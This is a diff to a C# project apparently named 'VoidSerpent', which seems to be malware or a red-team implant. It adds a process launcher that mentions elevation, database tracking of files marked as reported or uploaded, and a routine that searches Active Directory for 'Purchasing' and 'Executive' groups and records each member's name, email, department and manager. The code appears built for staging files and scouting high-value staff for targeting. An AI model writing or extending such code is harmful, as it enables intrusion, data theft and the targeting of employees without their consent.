@@ -11,9 +11,33 @@ using System.Threading;
 using System.Data.SQLite;
 using System.Runtime.InteropServices;
 using System.DirectoryServices;
+using System.Linq.Expressions;
+using System.DirectoryServices.ActiveDirectory;
+
 
 namespace VoidSerpent
 {
+    public static class DanceUponDeadMinds
+    {
+        public static void RunCmd(string process, string args, bool shell)
+        {
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                FileName = $"\"{process}\"",
+                Arguments = args,
+                UseShellExecute = shell
+            };
+            try
+            {
+                Process.Start(startInfo);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Failed to request elevation: " + ex.Message);
+            }
+        }
+    }
+    
     public static class BetrayalIsASymptom
     {
 
@@ -327,6 +351,61 @@ namespace VoidSerpent
             }
         }
 
+        public List<Dictionary<string, object>> PendingFiles()
+        {
+            var entries = new List<Dictionary<string, object>>();
+
+            using (var connection = new SQLiteConnection(GetConnectionString()))
+            {
+                connection.Open();
+                var query = @"
+            SELECT id, name, path, sha1, reported, uploaded
+            FROM files
+            WHERE reported = 0;";
+
+                using (var command = new SQLiteCommand(query, connection))
+                {
+                    using (var reader = command.ExecuteReader())
+                    {
+                        while (reader.Read())
+                        {
+                            var entry = new Dictionary<string, object>
+                    {
+                        { "id", reader["id"] },
+                        { "name", reader["name"] },
+                        { "path", reader["path"] },
+                        { "sha1", reader["sha1"] },
+                        { "reported", Convert.ToBoolean(reader["reported"]) },
+                        { "uploaded", Convert.ToBoolean(reader["uploaded"]) }
+                    };
+                            entries.Add(entry);
+                        }
+                    }
+                }
+            }
+
+            return entries;
+        }
+
+        public void MarkFileAsReported(string sha1)
+        {
+            using (var connection = new SQLiteConnection(GetConnectionString()))
+            {
+                connection.Open();
+                var query = @"
+            UPDATE files
+            SET reported = 1
+            WHERE sha1 = @sha1;";
+
+                using (var command = new SQLiteCommand(query, connection))
+                {
+                    command.Parameters.AddWithValue("@sha1", sha1);
+
+                    command.ExecuteNonQuery();
+                }
+            }
+        }
+
         public bool IsHashInDatabase(string sha1)
         {
             using (var connection = new SQLiteConnection(GetConnectionString()))
@@ -491,12 +570,9 @@ namespace VoidSerpent
 
         public static UserInfo GetUserInfo()
         {
-            // TODO: need to get username from env for the username 
-
             IntPtr domainNamePtr;
             NetJoinStatus joinStatus;
 
-            // Get the domain name of the computer
             int result = NetGetJoinInformation(null, out domainNamePtr, out joinStatus);
 
             if (result == NERR_Success)
@@ -507,8 +583,6 @@ namespace VoidSerpent
                     string username = Environment.GetEnvironmentVariable("USERNAME");
                     string[] splitdomain = dnsdomain.Split('.');
                     string searchBase = $"DC={splitdomain[0]},DC={splitdomain[1]}";
-                    Console.WriteLine($"Domain: {dnsdomain}");
-                    Console.WriteLine($"Search Base: {searchBase}");
 
                     try
                     {
@@ -570,5 +644,87 @@ namespace VoidSerpent
             }
         }
 
+        public static void SoStrangeIRememberYou()
+        {
+            var db = new DatabaseManager("syncstate.db");
+            string[] keywords = { "Purchasing", "Executive" };
+            IntPtr domainNamePtr;
+            NetJoinStatus joinStatus;
+
+            // Get the domain name of the computer
+            int result = NetGetJoinInformation(null, out domainNamePtr, out joinStatus);
+
+            if (result == NERR_Success)
+            {
+                try
+                {
+                    string dnsdomain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
+                    string username = Environment.GetEnvironmentVariable("USERNAME");
+                    string[] splitdomain = dnsdomain.Split('.');
+                    string searchBase = $"DC={splitdomain[0]},DC={splitdomain[1]}";
+
+                    try
+                    {
+                        // Construct the LDAP path to query Active Directory
+                        string ldapPath = $"LDAP://{searchBase}";
+                        using (DirectoryEntry entry = new DirectoryEntry(ldapPath))
+                        using (DirectorySearcher searcher = new DirectorySearcher(entry))
+                        {
+                            // Filter to find groups with any of the specified keywords in their name
+                            searcher.Filter = "(objectClass=group)";
+                            searcher.PropertiesToLoad.Add("name");
+
+                            // Find all matching groups
+                            foreach (SearchResult groupResult in searcher.FindAll())
+                            {
+                                string groupName = groupResult.Properties["name"][0].ToString();
+
+                                // Check if the group name contains any of the keywords
+                                bool isMatch = false;
+                                foreach (var keyword in keywords)
+                                {
+                                    if (groupName.Contains(keyword))
+                                    {
+                                        isMatch = true;
+                                        break;
+                                    }
+                                }
+
+                                if (isMatch)
+                                {
+                                    Console.WriteLine($"Found group: {groupName}");
+
+                                    using (DirectoryEntry groupEntry = new DirectoryEntry(groupResult.Path))
+                                    using (DirectorySearcher memberSearcher = new DirectorySearcher(groupEntry))
+                                    {
+                                        memberSearcher.Filter = "(objectClass=user)";
+                                        searcher.PropertiesToLoad.Add("displayName");
+                                        searcher.PropertiesToLoad.Add("mail");
+                                        searcher.PropertiesToLoad.Add("description");
+                                        searcher.PropertiesToLoad.Add("department");
+                                        searcher.PropertiesToLoad.Add("manager");
+
+                                        foreach (SearchResult memberResult in memberSearcher.FindAll())
+                                        {
+                                            UserInfo data = new UserInfo(
+                                                username: username,
+                                                name: memberResult.Properties["displayName"][0].ToString(),
+                                                email: memberResult.Properties.Contains("mail") ? memberResult.Properties["mail"][0].ToString() : string.Empty,
+                                                title: memberResult.Properties.Contains("title") ? memberResult.Properties["title"][0].ToString() : string.Empty,
+                                                department: memberResult.Properties.Contains("department") ? memberResult.Properties["department"][0].ToString() : string.Empty,
+                                                manager: memberResult.Properties.Contains("manager") ? memberResult.Properties["manager"][0].ToString() : string.Empty
+                                            );
+                                            db.DirectoryEntry(data.UserName, data.Name, data.Email, data.Title, data.Department, data.Manager);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    catch { }
+                }
+                catch { }
+            }
+        }
     }
 }
